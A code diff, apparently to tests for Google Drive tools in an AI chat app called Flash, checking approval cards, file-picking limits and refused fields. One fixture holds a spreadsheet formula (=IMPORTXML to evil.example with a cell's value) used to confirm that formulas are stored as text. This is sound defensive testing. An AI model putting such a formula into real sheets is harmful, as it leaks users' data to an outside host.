@@ -484,7 +484,7 @@ test("only picked files: an id the user didn't pick is refused before any reques
     "the only requests were for the picked Sheet",
   );
   // A write to a file that isn't picked: refused when approved, and nothing written.
-  const card = await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: PRIVATE, rows: [["x"]] });
+  const card = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: PRIVATE, rows: [["x"]] }))!;
   await kit.close();
   assert.equal(card.labels, undefined, "no name for a file Flash doesn't know");
   const done = await answer(user, card);
@@ -565,10 +565,10 @@ test("writes wait for Approve: the card shows the whole content; approved, each 
   // Rows added to a picked Sheet: the card names the file and shows every row; written as plain values, once.
   const kit = (await chatKit(user.id, [id]))!;
   const rows = [["Taxi", 30], ["=IMPORTXML(\"https://evil.example/?q=\"&A1,\"//a\")", "formula stays text"]];
-  const append = await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows });
-  const sheet = await kit.propose(kit.tools.find((t) => t.tool === "create_sheet")!, { title: "Trip costs", rows: [["Item", "Cost"], ["Hotel", 120]] });
-  const slides = await kit.propose(kit.tools.find((t) => t.tool === "create_slides")!, { title: "Trip", slides: [{ title: "Day 1", body: "Oslo" }, { title: "Day 2", body: "Bergen" }] });
-  const never = await kit.propose(kit.tools.find((t) => t.tool === "create_doc")!, { title: "Never", text: "" });
+  const append = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows }))!;
+  const sheet = (await kit.propose(kit.tools.find((t) => t.tool === "create_sheet")!, { title: "Trip costs", rows: [["Item", "Cost"], ["Hotel", 120]] }))!;
+  const slides = (await kit.propose(kit.tools.find((t) => t.tool === "create_slides")!, { title: "Trip", slides: [{ title: "Day 1", body: "Oslo" }, { title: "Day 2", body: "Bergen" }] }))!;
+  const never = (await kit.propose(kit.tools.find((t) => t.tool === "create_doc")!, { title: "Never", text: "" }))!;
   await kit.close();
   assert.deepEqual(append.labels, { file_id: "Budget" });
   assert.deepEqual(append.input, { file_id: SHEET, rows });
@@ -623,9 +623,9 @@ test("a field a tool doesn't have is refused, never dropped: what runs is exactl
   const deckSchema = kit.tools.find((t) => t.tool === "create_slides")!.definition.input_schema as { properties: { slides: { items: { additionalProperties?: unknown } } } };
   assert.equal(deckSchema.properties.slides.items.additionalProperties, false);
   // Cards made with one anyway never send anything.
-  const doc = await kit.propose(kit.tools.find((t) => t.tool === "create_doc")!, { title: "Shared", text: "Hi", share_with: "someone@example.com" });
-  const deck = await kit.propose(kit.tools.find((t) => t.tool === "create_slides")!, { title: "Trip", slides: [{ title: "Day 1", body: "Oslo", notes: "secret" }] });
-  const rows = await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["Taxi", 30]], valueInputOption: "USER_ENTERED" });
+  const doc = (await kit.propose(kit.tools.find((t) => t.tool === "create_doc")!, { title: "Shared", text: "Hi", share_with: "someone@example.com" }))!;
+  const deck = (await kit.propose(kit.tools.find((t) => t.tool === "create_slides")!, { title: "Trip", slides: [{ title: "Day 1", body: "Oslo", notes: "secret" }] }))!;
+  const rows = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["Taxi", 30]], valueInputOption: "USER_ENTERED" }))!;
   await kit.close();
   const before = mock.googleLog.calls.length;
   for (const [card, why] of [
@@ -650,7 +650,7 @@ test("Google's rate limit: a clear note, in the user's language on a card, and n
   const out = await kit.run(kit.tools.find((t) => t.tool === "read_file")!, { file_id: SHEET });
   assert.deepEqual(out, { text: GOOGLE_PROBLEMS.rate, isError: true });
   assert.equal(mock.googleLog.calls.length, 1, "asked once");
-  const card = await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["x"]] });
+  const card = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["x"]] }))!;
   await kit.close();
   const done = (await runApproved(user.id, card.id, card.inputHash))!;
   assert.equal(done.status, "failed");
@@ -706,7 +706,7 @@ test("Reconnect as another Google account: the old account's grant is cancelled 
   const user = await account("g-switch");
   const id = await withFiles(user, [SHEET]);
   const kit = (await chatKit(user.id, [id], { replyId: "sw1" }))!;
-  const card = await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["old account"]] });
+  const card = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["old account"]] }))!;
   await kit.close();
   mock.google.sub = "110000000000000000002";
   mock.google.email = "other-user@example.com";
@@ -729,7 +729,7 @@ test("removing Google Drive revokes Flash's access at Google and forgets the pic
   const user = await account("g-remove");
   const id = await withFiles(user, [DOC, SHEET]);
   const kit = (await chatKit(user.id, [id], { replyId: "rm1" }))!;
-  const card = await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["late"]] });
+  const card = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["late"]] }))!;
   await kit.close();
   const b0 = await balance(user.id);
   const remove = (origin: string | null = ORIGIN) => connectRoute.DELETE(request("DELETE", "/api/connect", user, { id }, origin));
@@ -756,7 +756,7 @@ test("Google Drive is hidden everywhere until all four of its variables are set 
   const user = await account("g-hidden");
   const id = await withFiles(user, [SHEET]);
   const kit = (await chatKit(user.id, [id], { replyId: "h1" }))!;
-  const card = await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["hidden"]] });
+  const card = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows: [["hidden"]] }))!;
   await kit.close();
   const cases: [string, string][] = [
     ["GOOGLE_CONNECT_CLIENT_ID", ""],
